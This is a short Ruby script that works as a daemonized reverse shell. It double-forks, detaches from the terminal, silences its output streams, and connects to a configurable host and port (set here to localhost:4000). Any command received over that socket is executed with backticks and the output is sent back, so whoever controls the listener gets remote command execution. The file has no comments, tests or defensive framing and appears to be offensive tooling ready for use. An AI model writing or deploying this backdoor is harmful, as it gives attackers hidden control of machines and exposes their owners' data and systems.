require 'socket'

if Process.fork
	exit
end

Process.setsid
if Process.fork
	exit
end

STDIN.reopen('/dev/null')
STDOUT.reopen('/dev/null', 'a')
STDERR.reopen('/dev/null', 'a')

HOST = "localhost"
PORT = "4000"

sock = TCPSocket.new HOST, PORT

while true
	begin	
		sock.print `pwd`.chomp + "$>"
		command = sock.gets&.strip
		next if command.nil?

		if command == "exit"
			break
		elsif command.start_with?("cd ")
			Dir.chdir(command[3..])
		else
			output = `#{command}`
			sock.puts output
		end
	rescue Errno::ENOENT => e
		sock.puts "Error: #{e.message}"
	end
end
sock.close
